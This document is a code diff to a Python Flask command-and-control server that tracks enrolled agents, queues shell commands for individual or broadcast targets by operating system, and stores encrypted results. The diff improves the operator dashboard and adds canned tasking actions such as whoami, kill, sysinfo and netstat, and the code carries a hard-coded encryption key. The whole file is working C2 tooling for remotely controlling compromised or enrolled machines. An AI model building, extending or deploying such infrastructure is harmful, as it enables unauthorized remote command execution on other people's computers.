@@ -1,18 +1,18 @@
-from flask import Flask, request, render_template, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 from cryptography.fernet import Fernet
 from datetime import datetime
 import sqlite3
 import time
 import json
 import uuid
+import os
 
-app = Flask(__name__)
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+app = Flask(__name__, template_folder=BASE_DIR, static_folder=BASE_DIR)
 
 SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
 cipher = Fernet(SECRET_KEY)
-DB_FILE = 'c2.db'
-
-
+DB_FILE = os.path.join(BASE_DIR, 'c2.db')
 TARGET_BROADCASTS = {"ALL", "BROADCAST_WINDOWS", "BROADCAST_LINUX"}
 
 
@@ -30,22 +30,14 @@ def query_db(query, args=(), one=False):
 
 
 def init_db():
-    query_db(
-        '''CREATE TABLE IF NOT EXISTS agents
-                (hostname TEXT PRIMARY KEY, ip TEXT, os TEXT, last_seen TEXT, relay TEXT)'''
-    )
-    query_db(
-        '''CREATE TABLE IF NOT EXISTS results
-                (id TEXT PRIMARY KEY, hostname TEXT, os TEXT, timestamp TEXT, output TEXT)'''
-    )
-    query_db(
-        '''CREATE TABLE IF NOT EXISTS tasks
-                (id INTEGER PRIMARY KEY AUTOINCREMENT, target_type TEXT, command TEXT, timestamp TEXT)'''
-    )
-    query_db(
-        '''CREATE TABLE IF NOT EXISTS task_receipts
-                (task_id INTEGER, hostname TEXT)'''
-    )
+    query_db('''CREATE TABLE IF NOT EXISTS agents
+                (hostname TEXT PRIMARY KEY, ip TEXT, os TEXT, last_seen TEXT, relay TEXT)''')
+    query_db('''CREATE TABLE IF NOT EXISTS results
+                (id TEXT PRIMARY KEY, hostname TEXT, os TEXT, timestamp TEXT, output TEXT)''')
+    query_db('''CREATE TABLE IF NOT EXISTS tasks
+                (id INTEGER PRIMARY KEY AUTOINCREMENT, target_type TEXT, command TEXT, timestamp TEXT)''')
+    query_db('''CREATE TABLE IF NOT EXISTS task_receipts
+                (task_id INTEGER, hostname TEXT)''')
 
 
 init_db()
@@ -55,9 +47,9 @@ def normalize_os_family(os_name):
     text = (os_name or "").lower()
     if "win" in text:
         return "WINDOWS"
-    if "linux" in text or "ubuntu" in text or "debian" in text or "kali" in text:
+    if any(x in text for x in ["linux", "ubuntu", "debian", "kali", "arch", "fedora", "centos"]):
         return "LINUX"
-    if "darwin" in text or "mac" in text or "os x" in text:
+    if any(x in text for x in ["darwin", "mac", "os x"]):
         return "MAC"
     return "UNKNOWN"
 
@@ -65,14 +57,23 @@ def normalize_os_family(os_name):
 def parse_status(last_seen, now):
     try:
         last_dt = datetime.combine(now.date(), datetime.strptime(last_seen, '%H:%M:%S').time())
-        return "ONLINE" if (now - last_dt).total_seconds() < 45 else "OFFLINE"
+        age = (now - last_dt).total_seconds()
+        if age < 45:
+            return "ONLINE"
+        if age < 180:
+            return "STALE"
+        return "OFFLINE"
     except ValueError:
         return "UNKNOWN"
 
 
+def status_weight(status):
+    return {"ONLINE": 3, "STALE": 2, "OFFLINE": 1, "UNKNOWN": 0}.get(status, 0)
+
+
 @app.route('/')
 def dashboard():
-    return render_template('index.html')
+    return send_from_directory(BASE_DIR, 'index.html')
 
 
 @app.route('/checkin', methods=['POST'])
@@ -90,11 +91,10 @@ def checkin():
         )
 
         cmd_row = query_db(
-            '''
-            SELECT * FROM tasks t
-            WHERE (t.target_type = 'ALL' OR t.target_type = ? OR t.target_type = ?)
-            AND NOT EXISTS (SELECT 1 FROM task_receipts r WHERE r.task_id = t.id AND r.hostname = ?)
-            ORDER BY t.id ASC LIMIT 1''',
+            '''SELECT * FROM tasks t
+               WHERE (t.target_type = 'ALL' OR t.target_type = ? OR t.target_type = ?)
+               AND NOT EXISTS (SELECT 1 FROM task_receipts r WHERE r.task_id = t.id AND r.hostname = ?)
+               ORDER BY t.id ASC LIMIT 1''',
             (f"BROADCAST_{os_family}", host, host),
             one=True,
         )
@@ -112,125 +112,121 @@ def checkin():
 @app.route('/api/stats')
 def api_stats():
     now = datetime.now()
-    agents = [dict(row) for row in query_db("SELECT * FROM agents ORDER BY hostname COLLATE NOCASE ASC")]
-    tasks = [dict(row) for row in query_db("SELECT * FROM tasks ORDER BY id DESC")]
+    agents_raw = [dict(r) for r in query_db("SELECT * FROM agents")]
+    tasks = [dict(r) for r in query_db("SELECT * FROM tasks ORDER BY id DESC")]
 
-    # Filters
     agent_search = request.args.get('agent_search', '').strip().lower()
     agent_os = request.args.get('agent_os', 'ALL').upper()
-    agent_status_filter = request.args.get('agent_status', 'ALL').upper()
+    agent_status = request.args.get('agent_status', 'ALL').upper()
 
     results_search = request.args.get('results_search', '').strip().lower()
     results_os = request.args.get('results_os', 'ALL').upper()
     results_host = request.args.get('results_host', 'ALL')
 
     try:
-        results_limit = min(max(int(request.args.get('results_limit', 120)), 20), 500)
+        results_limit = min(max(int(request.args.get('results_limit', 150)), 25), 500)
     except ValueError:
-        results_limit = 120
-
-    total_agents = len(agents)
-    online_count = 0
-    windows_count = 0
-    linux_count = 0
+        results_limit = 150
 
     enriched_agents = []
-    for a in agents:
+    os_counts = {"WINDOWS": 0, "LINUX": 0, "MAC": 0, "UNKNOWN": 0}
+    status_counts = {"ONLINE": 0, "STALE": 0, "OFFLINE": 0, "UNKNOWN": 0}
+
+    for a in agents_raw:
+        os_family = normalize_os_family(a.get('os'))
         status = parse_status(a.get('last_seen', ''), now)
-        os_family = normalize_os_family(a.get('os', ''))
-
-        if status == 'ONLINE':
-            online_count += 1
-        if os_family == 'WINDOWS':
-            windows_count += 1
-        elif os_family == 'LINUX':
-            linux_count += 1
-
-        a['status'] = status
+        os_counts[os_family] = os_counts.get(os_family, 0) + 1
+        status_counts[status] = status_counts.get(status, 0) + 1
         a['os_family'] = os_family
+        a['status'] = status
         enriched_agents.append(a)
+
+    enriched_agents.sort(key=lambda x: (-status_weight(x['status']), x['hostname'].lower()))
 
     filtered_agents = []
     for a in enriched_agents:
-        if agent_search and agent_search not in a['hostname'].lower() and agent_search not in a['os'].lower():
+        if agent_search and agent_search not in f"{a['hostname']} {a['os']} {a.get('ip', '')}".lower():
             continue
         if agent_os != 'ALL' and a['os_family'] != agent_os:
             continue
-        if agent_status_filter != 'ALL' and a['status'] != agent_status_filter:
+        if agent_status != 'ALL' and a['status'] != agent_status:
             continue
         filtered_agents.append(a)
 
-    all_results = [dict(row) for row in query_db("SELECT * FROM results ORDER BY timestamp DESC, id DESC LIMIT 500")]
-    enriched_results = []
-    for r in all_results:
-        os_family = normalize_os_family(r.get('os', ''))
-        r['os_family'] = os_family
-        enriched_results.append(r)
-
+    all_results = [dict(r) for r in query_db("SELECT * FROM results ORDER BY timestamp DESC, id DESC LIMIT 800")]
     filtered_results = []
-    for r in enriched_results:
+    for r in all_results:
+        r['os_family'] = normalize_os_family(r.get('os', ''))
         if results_os != 'ALL' and r['os_family'] != results_os:
             continue
         if results_host != 'ALL' and r['hostname'] != results_host:
             continue
-        if results_search:
-            searchable = f"{r['hostname']} {r['output']} {r.get('os', '')}".lower()
-            if results_search not in searchable:
-                continue
+        if results_search and results_search not in f"{r['hostname']} {r['output']} {r.get('os', '')}".lower():
+            continue
         filtered_results.append(r)
 
     filtered_results = filtered_results[:results_limit]
 
-    queue_data = []
-    total_windows = sum(1 for a in enriched_agents if a['os_family'] == 'WINDOWS')
-    total_linux = sum(1 for a in enriched_agents if a['os_family'] == 'LINUX')
+    total_agents = len(enriched_agents)
+    total_windows = os_counts.get('WINDOWS', 0)
+    total_linux = os_counts.get('LINUX', 0)
 
+    queue_data = []
     for t in tasks:
         receipts = [r['hostname'] for r in query_db("SELECT hostname FROM task_receipts WHERE task_id = ?", (t['id'],))]
         target = t['target_type']
 
         is_complete = False
-        if target == "ALL" and len(receipts) >= total_agents and total_agents > 0:
+        if target == "ALL" and total_agents > 0 and len(receipts) >= total_agents:
             is_complete = True
-        elif target == "BROADCAST_WINDOWS" and len(receipts) >= total_windows and total_windows > 0:
+        elif target == "BROADCAST_WINDOWS" and total_windows > 0 and len(receipts) >= total_windows:
             is_complete = True
-        elif target == "BROADCAST_LINUX" and len(receipts) >= total_linux and total_linux > 0:
+        elif target == "BROADCAST_LINUX" and total_linux > 0 and len(receipts) >= total_linux:
             is_complete = True
         elif target not in TARGET_BROADCASTS and len(receipts) > 0:
             is_complete = True
 
         if not is_complete:
-            queue_data.append(
-                {
-                    "target": target,
-                    "command": t['command'],
-                    "timestamp": t.get('timestamp') or "--:--:--",
-                    "seen_list": receipts,
-                }
-            )
+            queue_data.append({
+                "task_id": t['id'],
+                "target": target,
+                "command": t['command'],
+                "timestamp": t.get('timestamp') or "--:--:--",
+                "seen_count": len(receipts),
+                "seen_list": receipts,
+            })
 
-    queue_data = queue_data[:200]
+    queue_data = queue_data[:300]
 
-    host_options = [a['hostname'] for a in enriched_agents]
+    cmd_volume = []
+    for r in all_results[:200]:
+        cmd_volume.append({"timestamp": r['timestamp'], "hostname": r['hostname']})
 
-    return jsonify(
-        {
-            "agents": filtered_agents,
-            "results": filtered_results,
-            "queue": queue_data,
-            "total_count": online_count,
-            "stats": {
-                "total_agents": total_agents,
-                "online_agents": online_count,
-                "windows_agents": windows_count,
-                "linux_agents": linux_count,
-                "offline_agents": max(total_agents - online_count, 0),
-            },
-            "filters": {
-                "result_hosts": host_options,
-            },
+    return jsonify({
+        "agents": filtered_agents,
+        "results": filtered_results,
+        "queue": queue_data,
+        "total_count": status_counts.get('ONLINE', 0),
+        "stats": {
+            "total_agents": total_agents,
+            "online_agents": status_counts.get('ONLINE', 0),
+            "stale_agents": status_counts.get('STALE', 0),
+            "offline_agents": status_counts.get('OFFLINE', 0),
+            "unknown_agents": status_counts.get('UNKNOWN', 0),
+            "windows_agents": os_counts.get('WINDOWS', 0),
+            "linux_agents": os_counts.get('LINUX', 0),
+            "mac_agents": os_counts.get('MAC', 0),
+            "queue_size": len(queue_data),
+            "results_count": len(filtered_results),
+        },
+        "filters": {
+            "result_hosts": sorted({a['hostname'] for a in enriched_agents}, key=lambda x: x.lower()),
+            "agent_hosts": sorted({a['hostname'] for a in enriched_agents}, key=lambda x: x.lower()),
+        },
+        "telemetry": {
+            "recent_result_events": cmd_volume,
         }
-    )
+    })
 
 
 @app.route('/result', methods=['POST'])
@@ -241,12 +237,8 @@ def get_result():
             return "Format Error", 400
 
         host, output = decrypted_output.split('|', 1)
-
         agent = query_db("SELECT os FROM agents WHERE hostname = ?", (host,), one=True)
-        if agent:
-            os_type = agent['os']
-        else:
-            os_type = "Unknown"
+        os_type = agent['os'] if agent else "Unknown"
 
         query_db(
             "INSERT INTO results (id, hostname, os, timestamp, output) VALUES (?, ?, ?, ?, ?)",
@@ -263,7 +255,7 @@ def send_command():
     target = request.form.get('target')
     command = request.form.get('command')
 
-    if not target or not command:
+    if not target or not command or not command.strip():
         return "Missing fields", 400
 
     query_db(
@@ -295,16 +287,18 @@ def agent_action():
         "kill": "taskkill /F /IM python.exe" if is_windows else "pkill -f agent.py",
         "sysinfo": "Get-ComputerInfo | Select-Object OSName, OSVersion" if is_windows else "uname -a; cat /etc/os-release",
         "netstat": "Get-NetTCPConnection | Select-Object LocalAddress, RemoteAddress, State" if is_windows else "ss -tulpn",
+        "whoami": "whoami",
     }
 
     cmd = commands.get(action)
-    if cmd:
-        query_db(
-            "INSERT INTO tasks (target_type, command, timestamp) VALUES (?, ?, ?)",
-            (hostname, cmd, time.strftime('%H:%M:%S')),
-        )
-        return jsonify({"status": "Tasked"}), 200
-    return "Invalid Action", 400
+    if not cmd:
+        return "Invalid Action", 400
+
+    query_db(
+        "INSERT INTO tasks (target_type, command, timestamp) VALUES (?, ?, ?)",
+        (hostname, cmd, time.strftime('%H:%M:%S')),
+    )
+    return jsonify({"status": "Tasked"}), 200
 
 
 if __name__ == "__main__":
